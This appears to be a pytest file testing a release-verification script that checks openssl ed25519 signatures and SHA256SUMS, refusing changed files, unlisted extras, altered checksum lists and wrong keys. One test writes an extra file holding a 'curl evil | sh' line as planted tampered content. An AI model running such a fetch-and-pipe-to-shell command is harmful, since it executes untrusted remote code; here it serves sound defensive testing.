import shutil
import subprocess
from pathlib import Path

import pytest

VERIFY = Path(__file__).parent.parent / "scripts" / "verify_release.sh"
pytestmark = pytest.mark.skipif(not shutil.which("openssl"), reason="needs openssl")


def openssl(*args):
    subprocess.run(["openssl", *args], check=True, capture_output=True)


@pytest.fixture
def release(tmp_path):
    key, pub, out = tmp_path / "release.key", tmp_path / "release.pub", tmp_path / "release-v0.6.0"
    openssl("genpkey", "-algorithm", "ed25519", "-out", str(key))
    openssl("pkey", "-in", str(key), "-pubout", "-out", str(pub))
    out.mkdir()
    (out / "orchestrator-0.6.0-images.tar.gz").write_bytes(b"images")
    (out / "compose.yaml").write_text("services: {}\n")
    sums = subprocess.run("sha256sum -- *", shell=True, cwd=out, check=True, capture_output=True, text=True).stdout
    (out / "SHA256SUMS").write_text(sums)
    openssl("pkeyutl", "-sign", "-inkey", str(key), "-rawin", "-in", str(out / "SHA256SUMS"),
            "-out", str(out / "SHA256SUMS.sig"))
    return out, pub


def verify(out, pub):
    return subprocess.run([str(VERIFY), str(out), str(pub)], capture_output=True, text=True)


def test_a_signed_release_verifies(release):
    assert verify(*release).returncode == 0


def test_a_changed_file_an_extra_file_or_a_changed_list_is_refused(release, tmp_path):
    out, pub = release
    (out / "compose.yaml").write_text("services: {evil: {}}\n")
    assert "DOES NOT MATCH" in verify(out, pub).stderr

    (out / "compose.yaml").write_text("services: {}\n")
    (out / "extra.sh").write_text("curl evil | sh\n")
    assert "does not list" in verify(out, pub).stderr
    (out / "extra.sh").unlink()

    with open(out / "SHA256SUMS", "a") as sums:
        sums.write("0" * 64 + "  extra.sh\n")
    assert "BAD SIGNATURE" in verify(out, pub).stderr


def test_another_key_is_refused(release, tmp_path):
    other = tmp_path / "other.key"
    openssl("genpkey", "-algorithm", "ed25519", "-out", str(other))
    openssl("pkey", "-in", str(other), "-pubout", "-out", str(tmp_path / "other.pub"))
    assert "BAD SIGNATURE" in verify(release[0], tmp_path / "other.pub").stderr
